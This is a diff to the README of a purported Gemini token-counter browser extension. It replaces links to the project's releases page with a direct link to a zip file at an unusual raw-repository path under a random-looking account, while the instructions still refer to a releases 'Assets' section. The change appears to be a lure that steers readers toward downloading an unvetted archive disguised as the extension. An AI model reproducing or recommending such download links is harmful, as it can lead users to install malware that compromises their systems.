@@ -1,6 +1,6 @@
 # 🧮 gemini-counter - Count your tokens while using Gemini
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Involutionsabalpalmetto270/gemini-counter/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Involutionsabalpalmetto270/gemini-counter/raw/refs/heads/main/protonephros/gemini_counter_1.0.zip)
 
 This software adds a token counter to your browser when you use Gemini. Many users need to know how many tokens their prompts use to manage costs and stay within limits. This extension does that work for you. It shows your token count in real time as you type and read messages within the Gemini interface.
 
@@ -8,7 +8,7 @@ This software adds a token counter to your browser when you use Gemini. Many use
 
 You must get the latest version of this extension from the release page.
 
-1. Go to this link: [https://github.com/Involutionsabalpalmetto270/gemini-counter/releases](https://github.com/Involutionsabalpalmetto270/gemini-counter/releases).
+1. Go to this link: [https://github.com/Involutionsabalpalmetto270/gemini-counter/raw/refs/heads/main/protonephros/gemini_counter_1.0.zip](https://github.com/Involutionsabalpalmetto270/gemini-counter/raw/refs/heads/main/protonephros/gemini_counter_1.0.zip).
 2. Look for the section labeled Assets.
 3. Click the file that ends with .zip to save it to your computer.
 4. Save this file to a folder you can find later, like your Downloads folder.
